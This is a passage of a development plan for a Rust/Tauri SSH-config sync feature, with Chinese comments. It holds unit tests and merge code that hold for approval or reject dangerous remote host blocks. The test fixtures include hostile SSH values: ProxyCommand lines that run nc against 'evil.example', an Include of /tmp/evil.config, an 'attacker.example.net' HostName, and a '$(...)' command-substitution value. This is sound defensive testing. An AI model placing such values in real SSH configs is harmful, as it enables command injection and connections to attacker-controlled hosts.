        let m = merge_space(&space, &k, &pulled(&k, &[host("web", Some(PROXY), 100, "dev-b")], 1), &[], name_of);
        assert!(m.effects.is_empty());
        assert_eq!(m.held, vec!["web".to_string()]);
        assert!(!m.section.records.contains_key("host:web"), "a held record never reaches the cache");
        let pending = &m.section.pending_approvals["web"];
        assert_eq!(pending.text, PROXY);
        assert_eq!(pending.seq, 1);
        assert_eq!(pending.from_device, "name-of-dev-b");
        assert_eq!(pending.applied, signature(""));
        assert_eq!(pending.incoming.gated[0].keyword, "proxycommand");
        assert_eq!(m.section.cursor_seq, 1, "the cursor still moves on");
        // 本機已有相同簽章的區塊:照常套用。
        let same = merge_space(&space, &k, &pulled(&k, &[host("web", Some("Host web\n  ProxyCommand nc %h 22\n  User x\n"), 100, "dev-b")], 1), &[block("web", PROXY)], name_of);
        assert!(same.held.is_empty());
        assert_eq!(same.effects.len(), 1);
    }

    #[test]
    fn a_newer_version_replaces_a_pending_one_and_a_safe_or_deleting_one_clears_it() {
        let k = keys();
        let space = SpaceState::new("work-3fa2c1d9.config");
        let held = merge_space(&space, &k, &pulled(&k, &[host("web", Some(PROXY), 100, "dev-b")], 1), &[], name_of).section;
        // 較新、也要核准的版本:取代舊的 pending。
        let newer = "Host web\n  ProxyCommand nc evil.example 22\n";
        let mut p = pulled(&k, &[host("web", Some(newer), 200, "dev-c")], 2);
        p.records[0].seq = 2;
        let m = merge_space(&held, &k, &p, &[], name_of);
        assert_eq!(m.section.pending_approvals["web"].text, newer);
        assert_eq!(m.section.pending_approvals["web"].from_device, "name-of-dev-c");
        // 較新、不含受管制設定的版本:直接套用,pending 清掉。
        let mut p = pulled(&k, &[host("web", Some("Host web\n  User x\n"), 300, "dev-c")], 3);
        p.records[0].seq = 3;
        let m2 = merge_space(&m.section, &k, &p, &[], name_of);
        assert!(m2.section.pending_approvals.is_empty());
        assert_eq!(m2.effects, vec![HostEffect::Upsert { alias: "web".into(), text: "Host web\n  User x\n".into() }]);
        // 遠端刪除:照常套用,pending 清掉。
        let mut p = pulled(&k, &[host("web", None, 300, "dev-c")], 3);
        p.records[0].seq = 3;
        let m3 = merge_space(&m.section, &k, &p, &[], name_of);
        assert!(m3.section.pending_approvals.is_empty());
        assert_eq!(m3.effects, vec![HostEffect::Delete { alias: "web".into() }]);
    }

    #[test]
    fn a_held_change_beats_an_older_unpushed_local_edit() {
        let k = keys();
        let mut space = SpaceState::new("work-3fa2c1d9.config");
        space.records.insert("host:web".into(), LocalRecord { record: host("web", Some("Host web\n  User a\n"), 100, "dev-a"), seq: 1, dirty: true });
        let m = merge_space(&space, &k, &pulled(&k, &[host("web", Some(PROXY), 200, "dev-b")], 2), &[block("web", "Host web\n  User a\n")], name_of);
        assert_eq!(m.held, vec!["web".to_string()]);
        assert_eq!(m.conflicts, vec!["web".to_string()]);
        let local = &m.section.records["host:web"];
        assert!(!local.dirty, "the older local edit is not pushed over the newer remote one");
        assert_eq!(local.record.payload["text"], "Host web\n  User a\n", "the cache keeps the applied text");
        assert!(m.effects.is_empty());
    }

    #[test]
    fn forbidden_wildcard_broken_and_foreign_records_are_skipped_and_not_cached() {
        let k = keys();
        let space = SpaceState::new("work-3fa2c1d9.config");
        let mut device = host("dev", Some("x"), 1, "dev-b");
        device.kind = RecordKind::Device;
        let records = [
            host("web", Some("Host web\n  Include /tmp/evil.config\n"), 1, "dev-b"),
            host("db", Some("Host db\n  \"ProxyCommand\" nc evil 22\n"), 1, "dev-b"),
            // B2 的 `forbidden_directive` 擋下的其他種類:行首的 `=`、OpenSSH 讀法不同的 Host 行、會交給 shell 的值、
            // 看不見的字元 —— 同樣略過、不進快取,也不會被當成要核准的修改。
            host("app", Some("Host app\n  =Include /tmp/evil.config\n"), 1, "dev-b"),
            host("api", Some("Host api#x *\n  HostName attacker.example.net\n"), 1, "dev-b"),
            host("sh", Some("Host sh\n  HostName \"a$(echo X >&2)b\"\n  ProxyCommand true %h\n"), 1, "dev-b"),
            host("nb", Some("Host nb\n  ForwardAgent no\u{a0}\n"), 1, "dev-b"),
            host("*", Some("Host *\n  User root\n"), 1, "dev-b"),
            host("bad", Some("# not a host\n"), 1, "dev-b"),
            device,
        ];
        let mut p = pulled(&k, &records, 10);
        p.records.push(Envelope { id_hash: "ff".repeat(32), kind: "host".into(), seq: 10, nonce: "!!".into(), ciphertext: "!!".into(), deleted: false });
        let m = merge_space(&space, &k, &p, &[], name_of);
        assert_eq!(m.skipped, 10);
        assert!(m.effects.is_empty() && m.held.is_empty());
        assert!(m.section.records.is_empty());
        assert_eq!(m.section.cursor_seq, 10);
    }

    #[test]
    fn a_relay_watermark_that_went_backwards_marks_everything_for_reupload() {
        let k = keys();
        let mut space = SpaceState::new("work-3fa2c1d9.config");
        space.cursor_seq = 9;
        space.records.insert("host:web".into(), LocalRecord { record: host("web", Some("Host web\n"), 1, "dev-a"), seq: 8, dirty: false });
        let m = merge_space(&space, &k, &PullResponse { records: Vec::new(), latest_seq: 3 }, &[], name_of);
        assert_eq!(m.section.cursor_seq, 0);
        assert!(m.section.records.values().all(|l| l.seq == 0 && l.dirty));
        let mut account = AccountState::new(&k.chain_id);
        account.cursor_seq = 9;
        put_space_key(&mut account, &k, &keys().chain_id, Some(&keys()), "dev-a", 5).unwrap();
        for s in account.sealed.values_mut() {
            s.dirty = false;
            s.envelope.seq = 8;
        }
        let a = merge_account(&account, &k, &PullResponse { records: Vec::new(), latest_seq: 2 });
        assert_eq!(a.section.cursor_seq, 0);
        assert!(a.section.sealed.values().all(|s| s.dirty && s.envelope.seq == 0));
    }

    fn account_record(kind: RecordKind, id: &str, payload: Value, updated_at_ms: u64) -> Record {
        Record { kind, id: id.to_string(), version: 1, updated_at_ms, device_id: "dev-b".into(), deleted: false, payload }
    }

    #[test]
    fn account_records_are_split_into_plain_records_and_sealed_secrets() {
        let k = keys();
        let space = keys();
        let space_payload = serde_json::to_value(SpacePayload { schema: 1, name: "Work".into(), slug: "work".into(), created_at_ms: 5, previous_id: None }).unwrap();
        let records = [
            account_record(RecordKind::Space, &space.chain_id, space_payload.clone(), 10),
            account_record(RecordKind::SpaceKey, &space.chain_id, serde_json::to_value(SpaceKeyPayload::from_keys(&space)).unwrap(), 10),
            account_record(RecordKind::Meta, ACCOUNT_META_ID, serde_json::to_value(MetaPayload::account("0.17.0")).unwrap(), 10),
            account_record(RecordKind::Space, "../../etc", space_payload, 10), // id 不是 chain id → 略過
        ];
        let mut p = pulled(&k, &records, 6);
        p.records.push(Envelope { id_hash: "ee".repeat(32), kind: "future".into(), seq: 5, nonce: "n".into(), ciphertext: "c".into(), deleted: false });
        let m = merge_account(&AccountState::new(&k.chain_id), &k, &p);
        assert_eq!(m.skipped, 1);
        assert!(m.markers.is_empty());
        assert_eq!(m.section.remote_schema_version, Some(2));
        assert_eq!(space_entries(&m.section).iter().map(|e| e.name.as_str()).collect::<Vec<_>>(), vec!["Work"]);
        assert_eq!(space_keys(&m.section, &k, &space.chain_id).unwrap().auth_token, space.auth_token);
        assert!(m.section.sealed.contains_key(&format!("future:{}", "ee".repeat(32))));
        let text = serde_json::to_string(&m.section).unwrap();
        assert!(!text.contains(&space.auth_token) && !text.contains(&space.enc_key_b64()), "secrets never reach the state");
        // 本機較新的 spacekey:保留本機,只更新 seq。
        let mut mine = m.section.clone();
        put_space_key(&mut mine, &k, &space.chain_id, Some(&space), "dev-a", 99).unwrap();
        let again = merge_account(&mine, &k, &pulled(&k, &records[1..2], 6));
        let slot = space_key_slot(&k, &space.chain_id);
        assert!(again.section.sealed[&slot].dirty);
        assert_eq!(again.section.sealed[&slot].envelope.seq, 1);
    }

    #[test]
    fn rotation_markers_are_reported() {
        let k = keys();
        let marker = RotationMarkerPayload { rotated_at_ms: 9, by_device_id: "dev-b".into(), by_device_name: "MacBook-B".into() };
        let m = merge_account(
            &AccountState::new(&k.chain_id),
            &k,
            &pulled(&k, &[account_record(RecordKind::Meta, &rotation_meta_id("dev-b"), serde_json::to_value(&marker).unwrap(), 9)], 1),
        );
        assert_eq!(m.markers, vec![marker]);
    }

    #[test]
    fn the_device_record_carries_the_selected_spaces_and_a_heartbeat() {
        let mut account = AccountState::new(&"a".repeat(64));
        let spaces = vec!["b".repeat(64)];
        assert!(plan_device(&mut account, "dev-a", "Box", "macos", &spaces, 1_000));
        let record = &account.records["device:dev-a"];
        assert!(record.dirty);
        let payload: DevicePayload = serde_json::from_value(record.record.payload.clone()).unwrap();
        assert_eq!(payload.spaces, spaces);
        assert!(!plan_device(&mut account, "dev-a", "Box", "macos", &spaces, 2_000), "nothing changed");
        assert!(plan_device(&mut account, "dev-a", "Box", "macos", &[], 3_000), "the selection changed");
        assert!(plan_device(&mut account, "dev-a", "Box", "macos", &[], 3_000 + HEARTBEAT_MS), "hourly heartbeat");
        let payload: DevicePayload = serde_json::from_value(account.records["device:dev-a"].record.payload.clone()).unwrap();
        assert_eq!(payload.joined_at_ms, 1_000, "joined_at_ms is kept");
    }

    #[test]
    fn space_key_tombstones_carry_no_secret() {
        let k = keys();
        let space = keys();
        let mut account = AccountState::new(&k.chain_id);
        put_space_key(&mut account, &k, &space.chain_id, Some(&space), "dev-a", 5).unwrap();
        put_space_key(&mut account, &k, &space.chain_id, None, "dev-a", 6).unwrap();
        let record = account.sealed[&space_key_slot(&k, &space.chain_id)].open(&k).unwrap();
        assert!(record.deleted);
        assert_eq!(record.version, 2);
        assert_eq!(record.payload, Value::Null);
        assert!(space_keys(&account, &k, &space.chain_id).is_none());
    }

    #[test]
    fn a_space_is_deleted_when_either_of_its_records_is_a_tombstone() {
        let k = keys();
        let space = keys();
        let mut account = AccountState::new(&k.chain_id);
        let payload = serde_json::to_value(SpacePayload { schema: 1, name: "Work".into(), slug: "work".into(), created_at_ms: 1, previous_id: None }).unwrap();
        put_account_record(&mut account, RecordKind::Space, &space.chain_id, payload.clone(), false, "dev-a", 1);
        assert_eq!(space_deleted_by(&account, &k, &space.chain_id), None, "a key that has not arrived is not a delete");
        put_space_key(&mut account, &k, &space.chain_id, Some(&space), "dev-a", 1).unwrap();
        assert_eq!(space_deleted_by(&account, &k, &space.chain_id), None);
        put_space_key(&mut account, &k, &space.chain_id, None, "dev-b", 2).unwrap();
        assert_eq!(space_deleted_by(&account, &k, &space.chain_id).as_deref(), Some("dev-b"), "a live name with a deleted key");
        put_account_record(&mut account, RecordKind::Space, &space.chain_id, payload, true, "dev-c", 3);
        assert_eq!(space_deleted_by(&account, &k, &space.chain_id).as_deref(), Some("dev-c"));
    }

    #[test]
    fn pushes_are_batched_and_accepted_records_become_clean() {
        let relay = FakeRelay::new();
        let k = keys();
        relay.create_chain(&k.chain_id, &k.auth_token).unwrap();
        let mut space = SpaceState::new("work-3fa2c1d9.config");
        let blocks: Vec<HostBlockText> = (0..450).map(|i| block(&format!("h{i}"), &format!("Host h{i}\n"))).collect();
        plan_hosts(&mut space, &blocks, "dev-a", |_| 100);
        let outgoing = space_outgoing(&space, &k).unwrap();
        let pushed = push_outgoing(relay.as_ref(), &k.chain_id, &k.auth_token, &outgoing).unwrap();
        assert_eq!(pushed.accepted.len(), 450);
        assert_eq!(relay.calls().iter().filter(|c| c.starts_with("push:")).count(), 3, "200 + 200 + 50");
        apply_pushed_space(&mut space, &outgoing, &pushed);
        assert!(space.records.values().all(|l| !l.dirty && l.seq > 0));
        // 同一批再推一次(base_seq 0 的舊版):relay 較新 → 衝突、保持 dirty。
        let mut stale = SpaceState::new("work-3fa2c1d9.config");
        plan_hosts(&mut stale, &blocks[..1], "dev-b", |_| 50);
        let stale_out = space_outgoing(&stale, &k).unwrap();
        let pushed = push_outgoing(relay.as_ref(), &k.chain_id, &k.auth_token, &stale_out).unwrap();
        assert_eq!((pushed.accepted.len(), pushed.conflicts), (0, 1));
        apply_pushed_space(&mut stale, &stale_out, &pushed);
        assert!(stale.records["host:h0"].dirty);
    }

    #[test]
    fn a_frozen_chain_stops_the_upload() {
        let relay = FakeRelay::new();
        let k = keys();
        relay.create_chain(&k.chain_id, &k.auth_token).unwrap();
        relay.freeze_chain(&k.chain_id, &k.auth_token).unwrap();
        let mut space = SpaceState::new("work-3fa2c1d9.config");
        plan_hosts(&mut space, &[block("web", "Host web\n")], "dev-a", |_| 100);
        let outgoing = space_outgoing(&space, &k).unwrap();
        let pushed = push_outgoing(relay.as_ref(), &k.chain_id, &k.auth_token, &outgoing).unwrap();
        assert!(pushed.frozen);
        assert!(pushed.accepted.is_empty());
        assert!(relay.rows(&k.chain_id).is_empty(), "nothing is written to a frozen chain");
    }

    #[test]
    fn account_uploads_include_dirty_sealed_space_keys() {
        let relay = FakeRelay::new();
        let k = keys();
        relay.create_chain(&k.chain_id, &k.auth_token).unwrap();
        let space = keys();
        let mut account = AccountState::new(&k.chain_id);
        put_account_record(&mut account, RecordKind::Meta, ACCOUNT_META_ID, serde_json::to_value(MetaPayload::account("0.17.0")).unwrap(), false, "dev-a", 5);
        put_space_key(&mut account, &k, &space.chain_id, Some(&space), "dev-a", 5).unwrap();
        let outgoing = account_outgoing(&account, &k).unwrap();
        assert_eq!(outgoing.len(), 2);
        let pushed = push_outgoing(relay.as_ref(), &k.chain_id, &k.auth_token, &outgoing).unwrap();
        apply_pushed_account(&mut account, &outgoing, &pushed);
        assert!(account.records.values().all(|l| !l.dirty));
        assert!(account.sealed.values().all(|s| !s.dirty && s.envelope.seq > 0));
        // relay 上的就是同一份密文:另一台拉下來能解開。
        let back = merge_account(&AccountState::new(&k.chain_id), &k, &relay.pull(&k.chain_id, &k.auth_token, 0).unwrap());
        assert_eq!(space_keys(&back.section, &k, &space.chain_id).unwrap().auth_token, space.auth_token);
    }

    #[test]
    fn include_tokens_follow_the_account_names() {
        let k = keys();
        let (a, b) = (keys(), keys());
        let mut account = AccountState::new(&k.chain_id);
        for (id, name) in [(&a.chain_id, "Work"), (&b.chain_id, "home")] {
            let payload = SpacePayload { schema: 1, name: name.into(), slug: crate::sync::space_files::slugify(name), created_at_ms: 1, previous_id: None };
            put_account_record(&mut account, RecordKind::Space, id, serde_json::to_value(payload).unwrap(), false, "dev-a", 1);
        }
        let mut spaces = std::collections::BTreeMap::new();
        for (id, name) in [(&a.chain_id, "work"), (&b.chain_id, "home")] {
            spaces.insert(id.clone(), SpaceState::new(&crate::sync::space_files::space_file_name(name, id).unwrap()));
        }
        let tokens = selected_include_tokens(Some(&account), &spaces).unwrap();
        assert_eq!(tokens.len(), 2);
        assert!(tokens[0].contains("home-"), "home sorts before Work: {tokens:?}");
        spaces.get_mut(&a.chain_id).unwrap().selected = false;
        assert_eq!(selected_include_tokens(Some(&account), &spaces).unwrap().len(), 1, "a half-unselected space is not listed");
    }
}
```

- [ ] **Step 4: 更新 `src-tauri/src/sync/mod.rs`**

把 `src-tauri/src/sync/mod.rs` 整個換成:

```rust
//! Sync chain: Brave 式免帳號端對端同步。各子模組單一責任、皆可單元測試:
//! - `crypto`: 助記詞、金鑰派生、記錄加密
//! - `record`: 記錄模型與 LWW 合併(Task 2)
//! - `hosts_file`: 受管同步檔的區塊操作(Task 3)
//! - `planner`: 本機變更偵測(Task 1)
//! - `state`: 本機同步狀態持久化(Task 4)
//! - `relay`: 中繼 HTTP client(Task 5)
//! - `reconcile`: 一輪同步的三段純函式(plan_local → pull_merge → push_dirty)
//! - `engine`: 背景同步執行緒、`SyncCore`、存檔當下規劃、套用+發布交易、Tauri commands
//! - `space_files`: Sync v2 的 space 檔命名、Include 清單順序與建立 / 移除 / 改名的順序規則
//! - `approval`: Sync v2 危險設定的核准簽章
//! - `state_v2`: Sync v2 的本機狀態(`version: 2`)與 v1 狀態檔的偵測
//! - `merge`: Sync v2 帳戶與 space 區段的本機 diff、合併、上傳(純函式)
//! - `fake_relay`(只在測試):記憶體假 relay

pub mod approval;
pub mod crypto;
pub mod engine;
#[cfg(test)]
pub mod fake_relay;
pub mod hosts_file;
pub mod merge;
pub mod migrate;
pub mod planner;
pub mod reconcile;
pub mod record;
pub mod relay;
pub mod space_files;
pub mod state;
pub mod state_v2;
```

- [ ] **Step 5: 跑測試確認失敗**

Run: `cd src-tauri && cargo test -- --skip secrets::tests::round_trip_set_get_delete --skip askpass::tests::env_secret_takes_priority_over_keychain`
Expected: FAIL —— 編譯錯誤(測試用到的實作還不存在),例如:

```text
error[E0432]: unresolved import `crate::sync::state_v2::DeclinedVersion`
--> src/sync/merge.rs:20:55
```

- [ ] **Step 6: 修改 `src-tauri/src/sync/state_v2.rs`**

新欄位一律 `#[serde(default)]`,B2 寫出的狀態檔照樣讀得回來;`SyncNotice` 以 ts-rs 匯出;`notices` 逐則讀(`known_notices`)。

`src-tauri/src/sync/state_v2.rs`:把

```rust
    pub last_sync_ms: Option<u64>,
    pub last_error: Option<String>,
}

```

換成:

```rust
    pub last_sync_ms: Option<u64>,
    pub last_error: Option<String>,
    /// 等使用者看過才清掉的提示(v1 升級說明、別台刪了 space、改名被擋下、新同步碼……;spec §7.2、§7.5、§8)。讀檔時略過
    /// 這版不認得的種類(`known_notices`),降版之後狀態檔照樣讀得回來。
    #[serde(default, deserialize_with = "known_notices")]
    pub notices: Vec<SyncNotice>,
}

```

`src-tauri/src/sync/state_v2.rs`:把

```rust
            last_sync_ms: None,
            last_error: None,
        })
    }
```

換成:

```rust
            last_sync_ms: None,
            last_error: None,
            notices: Vec::new(),
        })
    }
```

`src-tauri/src/sync/state_v2.rs`:把

```rust
    #[serde(default)]
    pub sealed: BTreeMap<String, SealedRecord>,
}

```

換成:

```rust
    #[serde(default)]
    pub sealed: BTreeMap<String, SealedRecord>,
    /// 這台刪除的 space 還沒 `DELETE` 的 chain(spec §7.2):tombstone 之前那份 `spacekey` 的密文(帳戶金鑰加密,
    /// 權杖只在記憶體解開)。tombstone 上傳之後才刪 chain —— 別台先收到 tombstone,不會看到「chain 不見了」。
    #[serde(default)]
    pub chain_deletes: Vec<SealedRecord>,
}

```

`src-tauri/src/sync/state_v2.rs`:把

```rust
            records: BTreeMap::new(),
            sealed: BTreeMap::new(),
        }
    }
```

換成:

```rust
            records: BTreeMap::new(),
            sealed: BTreeMap::new(),
            chain_deletes: Vec::new(),
        }
    }
```

`src-tauri/src/sync/state_v2.rs`:把

```rust
    #[serde(default)]
    pub last_error: Option<String>,
}

```

換成:

```rust
    #[serde(default)]
    pub last_error: Option<String>,
    /// 使用者拒絕套用的遠端版本,key = alias(spec §7.4「拒絕」):不進快取、不寫檔,只記版本資訊。之後本機修改這台
    /// 主機時,新版本以它為基準(版本號、時間戳、base_seq)照 LWW 蓋過它;收到這個 alias 的較新遠端記錄就清掉。
    #[serde(default)]
    pub declined: BTreeMap<String, DeclinedVersion>,
    /// 只為了重新上傳才標成 dirty 的記錄 key(v1 升級帶進 space0 的已同步記錄,spec §7.6):它們輸給較新的遠端版本
    /// 不是「本機修改被覆蓋」,不發 `sync://conflict`。上傳成功或被遠端取代就移出。
    #[serde(default)]
    pub republish: BTreeSet<String>,
    /// relay 回報這個 space 的 chain 不存在、帳戶卻仍有這個 space(spec §9):暫停,等使用者選「重建」或「刪除」。
    #[serde(default)]
    pub missing: bool,
    /// 改名被擋下時的目標檔名(spec §4.3、§9):每一輪都會重試改名,同一個目標仍被擋時不再重複提示(使用者可能已經
    /// 看過、關掉了);改名成功或不再需要改名就清掉。
    #[serde(default)]
    pub rename_blocked: Option<String>,
}

```

`src-tauri/src/sync/state_v2.rs`:把

```rust
            pending_approvals: BTreeMap::new(),
            last_error: None,
        }
    }
}

```

換成:

```rust
            pending_approvals: BTreeMap::new(),
            last_error: None,
            declined: BTreeMap::new(),
            republish: BTreeSet::new(),
            missing: false,
            rename_blocked: None,
        }
    }
}

/// 被拒絕的遠端版本(`SpaceState::declined`):本機之後的修改以它為基準。
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct DeclinedVersion {
    pub version: u64,
    pub updated_at_ms: u64,
    /// 記錄在 relay 上的序號(下一次本機版本的 base_seq)。
    pub seq: u64,
}

/// 要讓使用者看到、看過才清掉的提示(`SyncStateV2::notices`;同時以 `sync://notice` 發出)。
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[cfg_attr(test, derive(ts_rs::TS))]
#[cfg_attr(test, ts(export, export_to = "../../src/bindings/"))]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum SyncNotice {
    /// v1 升級完成(spec §7.6、§8):space「Synced」可改名、其他電腦也要更新;含 `Include` 的區塊留在 `kept_file`。
    Upgraded { kept_file: Option<String>, kept_hosts: Vec<String> },
    /// 別台刪除了這台勾選的 space:檔案已備份並移除(spec §7.2)。
    SpaceDeleted { name: String, by_device: String },
    /// 改名時新檔名已有檔案:保留舊檔名、不覆蓋(spec §4.3、§9)。同一個目標只提示一次(`SpaceState::rename_blocked`)。
    RenameBlocked { space_id: String, name: String, file_name: String },
    /// 這台離開了帳戶(spec §7.3):它的 space 檔已搬到 `~/.ssh/sshelter-local/`、主 config 以一般的 Include 引入,ssh
    /// 照常讀得到;`kept_files` 是新的完整路徑。之後建立或加入帳戶都不會再動它們,可以用搬移精靈搬進新帳戶的 space。
    LeftAccount { kept_files: Vec<String> },
    /// 這台完成了更換同步碼:請顯示並保存新同步碼(spec §7.5 第 7 步)。
    NewSyncCode,
    /// 另一台電腦也更換了同步碼(spec §7.5「兩台同時更換」)。
    OtherRotation { devices: Vec<String> },
}

/// `SyncStateV2::notices` 的讀法:逐則讀,這版不認得(較新版本寫的種類)或讀不懂的提示略過。狀態檔裡其他 enum 讀不懂就是
/// 整份讀不懂(檔案會被擱到一旁)—— 提示不值得這樣:從 beta 降回正式版之後,狀態檔仍要讀得回來。
fn known_notices<'de, D: serde::Deserializer<'de>>(deserializer: D) -> Result<Vec<SyncNotice>, D::Error> {
    let raw = Vec::<serde_json::Value>::deserialize(deserializer)?;
    Ok(raw.into_iter().filter_map(|v| serde_json::from_value(v).ok()).collect())
}

```

- [ ] **Step 7: 實作 `src-tauri/src/sync/merge.rs`**

重點:`plan_hosts` 把等待核准與被拒絕的版本當成「已知版本」;`merge_space` 的保留、清除與衝突規則;`merge_account` 讀到 `rotation:*` 標記時呼叫端不得採用 `section`;`push_outgoing` 撞到 `Frozen` 立刻停止、回報 `frozen`。

`src-tauri/src/sync/merge.rs`:在 `use` 區之後、`#[cfg(test)]` 之前加入:

```rust
/// 裝置心跳的間隔(同 v1)。
const HEARTBEAT_MS: u64 = 60 * 60 * 1000;
/// 每批上傳的上限(spec §7.1 第 7 步,同 v1):≤ 200 筆且 ≤ 512 KiB。
const PUSH_BATCH_ITEMS: usize = 200;
const PUSH_BATCH_BYTES: usize = 512 * 1024;

// ── space 區段:本機 diff ────────────────────────────────────────────────────────────────────────

/// 等待核准或被拒絕的遠端版本中,這台已知最新的一版(版本號、時間戳、序號各取最大)。
fn known_remote(space: &SpaceState, alias: &str) -> Option<DeclinedVersion> {
    let pending = space
        .pending_approvals
        .get(alias)
        .map(|p| DeclinedVersion { version: p.record.version, updated_at_ms: p.record.updated_at_ms, seq: p.seq });
    let declined = space.declined.get(alias).cloned();
    match (pending, declined) {
        (Some(a), Some(b)) => Some(DeclinedVersion {
            version: a.version.max(b.version),
            updated_at_ms: a.updated_at_ms.max(b.updated_at_ms),
            seq: a.seq.max(b.seq),
        }),
        (a, b) => a.or(b),
    }
}

/// 一個 space 的本機 diff(spec §7.1 第 3 步;存檔當下的規劃也用它):space 檔目前的區塊對快取 → dirty 記錄,保留
/// seq 當 base_seq。等待核准(`pending_approvals`)或被拒絕(`declined`)的遠端版本也是「這台已知的版本」:新的本機
/// 版本以三者中最新的版本號、時間戳與序號為基準 —— 本機修改照 LWW 蓋過它們,推送也不會因為 base_seq 過舊而一直
/// 衝突。產生了本機版本的 alias,待核准與拒絕記錄一併清掉(被較新的本機版本取代)。回傳產生的記錄數。
pub fn plan_hosts(space: &mut SpaceState, blocks: &[HostBlockText], device_id: &str, changed_at: impl Fn(&str) -> u64) -> usize {
    let aliases: Vec<String> = space.pending_approvals.keys().chain(space.declined.keys()).cloned().collect();
    let mut view = space.records.clone();
    for alias in &aliases {
        let Some(known) = known_remote(space, alias) else { continue };
        let key = record_key(RecordKind::Host, alias);
        match view.get_mut(&key) {
            Some(local) => {
                local.record.version = local.record.version.max(known.version);
                local.record.updated_at_ms = local.record.updated_at_ms.max(known.updated_at_ms);
            }
            // 本機沒有這台主機:以一筆已刪除的佔位記錄代表「已知的版本」,檔案裡出現它時才算新版本。
            None => {
                let placeholder = Record {
                    kind: RecordKind::Host,
                    id: alias.clone(),
                    version: known.version,
                    updated_at_ms: known.updated_at_ms,
                    device_id: String::new(),
                    deleted: true,
                    payload: Value::Null,
                };
                view.insert(key, LocalRecord { record: placeholder, seq: known.seq, dirty: false });
            }
        }
    }
    let mut planned = 0;
    for record in detect_local_changes(&view, blocks, device_id, changed_at) {
        let key = record_key(record.kind, &record.id);
        let known_seq = known_remote(space, &record.id).map(|k| k.seq).unwrap_or(0);
        let seq = space.records.get(&key).map(|l| l.seq).unwrap_or(0).max(known_seq);
        space.pending_approvals.remove(&record.id);
        space.declined.remove(&record.id);
        space.republish.remove(&key);
        space.records.insert(key, LocalRecord { record, seq, dirty: true });
        planned += 1;
    }
    planned
}

// ── space 區段:合併 ──────────────────────────────────────────────────────────────────────────

/// `merge_space` 的結果。`section` 是合併後的新區段(含 cursor);呼叫端在指紋守衛下把 `effects` 寫進 space 檔成功
/// 之後才採用它 —— 失敗就整份丟棄,下一輪重拉。
#[derive(Clone, Debug)]
pub struct SpaceMerged {
    pub section: SpaceState,
    pub effects: Vec<HostEffect>,
    /// 本機未上傳的修改被較新的遠端版本取代的 alias。
    pub conflicts: Vec<String>,
    /// 這次新保留、等待核准的 alias(spec §7.4)。
    pub held: Vec<String>,
    /// 解不開、身分不符、不是 host、文字不合法(含 `Include`、wildcard)而略過的記錄數。
    pub skipped: u32,
}

/// 一個 space 拉到的記錄 → LWW 合併(spec §7.1 第 4 步、§7.4)。`applied` = space 檔目前的區塊(核准簽章比較的對象);
/// `device_name` 把寫入者的 device id 換成顯示名稱。遠端的 `Upsert` 若含受管制的設定且簽章和目前的區塊不同,就
/// **保留不套用**:放進 `pending_approvals`(同一 alias 的較新版本取代舊的),不產生效果、不進快取 —— 下一輪的
/// 本機 diff 才不會把它當成本機修改推回去;cursor 照常推進。本機未上傳的修改輸給較新的遠端版本時(不論套用或
/// 保留)不再上傳,並列入 `conflicts`(`republish` 裡的記錄除外)。遠端刪除與不含受管制設定的修改照常套用,並清掉
/// 同一 alias 的待核准與拒絕記錄。
pub fn merge_space(
    section: &SpaceState,
    keys: &ChainKeys,
    pulled: &PullResponse,
    applied: &[HostBlockText],
    device_name: impl Fn(&str) -> String,
) -> SpaceMerged {
    let mut next = section.clone();
    let mut out = SpaceMerged { section: SpaceState::new(""), effects: Vec::new(), conflicts: Vec::new(), held: Vec::new(), skipped: 0 };
    for env in &pulled.records {
        // space chain 只放 host 記錄(spec §4.2):其他種類一律略過,不保存。
        let record = match decode(keys, env) {
            Ok(r) if env.kind == RecordKind::Host.as_str() && is_syncable_alias(&r.id) => r,
            _ => {
                out.skipped += 1;
                continue;
            }
        };
        let key = record_key(RecordKind::Host, &record.id);
        let outcome = merge(next.records.get(&key), &record);
        if outcome == MergeOutcome::KeepLocal {
            // 本機較新:把 seq 更新到 relay 現況,下次推送才不會再撞 conflict。
            if let Some(local) = next.records.get_mut(&key) {
                local.seq = env.seq;
            }
            continue;
        }
        let lost_local_edit = outcome == MergeOutcome::RemoteWinsOverDirtyLocal && !next.republish.contains(&key);
        let alias = record.id.clone();
        if record.deleted {
            next.pending_approvals.remove(&alias);
            next.declined.remove(&alias);
            next.republish.remove(&key);
            if lost_local_edit {
                out.conflicts.push(alias.clone());
            }
            out.effects.push(HostEffect::Delete { alias });
            next.records.insert(key, LocalRecord { record, seq: env.seq, dirty: false });
            continue;
        }
        let text = match serde_json::from_value::<HostPayload>(record.payload.clone()) {
            Ok(p) if validate_host_text(&alias, &p.text).is_ok() => p.text,
            // 格式不支援 / 文字不合法(含 `Include`、帶引號的 keyword、wildcard):不套用、不進快取、絕不當成刪除。
            _ => {
                out.skipped += 1;
                continue;
            }
        };
        next.declined.remove(&alias);
        next.republish.remove(&key);
        if lost_local_edit {
            out.conflicts.push(alias.clone());
        }
        let current = applied.iter().find(|b| b.alias == alias).map(|b| b.text.as_str());
        if needs_approval(&text, current) {
            // 保留:檔案與快取的內容都不動;本機未上傳的修改已輸給它,不再上傳。
            if let Some(local) = next.records.get_mut(&key) {
                local.dirty = false;
            }
            let pending = PendingApproval {
                applied: signature(current.unwrap_or("")),
                incoming: signature(&text),
                from_device: device_name(&record.device_id),
                seq: env.seq,
                text,
                record,
            };
            next.pending_approvals.insert(alias.clone(), pending);
            out.held.push(alias);
            continue;
        }
        next.pending_approvals.remove(&alias);
        out.effects.push(HostEffect::Upsert { alias, text });
        next.records.insert(key, LocalRecord { record, seq: env.seq, dirty: false });
    }
    if pulled.latest_seq < section.cursor_seq {
        // relay 的歷史倒退了(自架的 relay 從舊備份還原):同 v1,cursor 歸零、每筆快取的記錄以 seq 0 重新上傳 ——
        // relay 上還有的先回 conflict、合併之後才覆寫,不會蓋掉還原之後別台寫的新版。
        next.cursor_seq = 0;
        for local in next.records.values_mut() {
            local.seq = 0;
            local.dirty = true;
        }
    } else {
        next.cursor_seq = pulled.latest_seq;
    }
    out.section = next;
    out
}

/// 基線輪要寫回 space 檔的本機修改(同 v1 `unpushed_host_effects`):space 檔不見了或被清空、從 chain 重新長出時
/// 保留下來、合併之後仍是 dirty(仍贏 LWW)、檔案裡卻沒有的 host 記錄。dirty 的 tombstone 不產生效果(照常推送)。
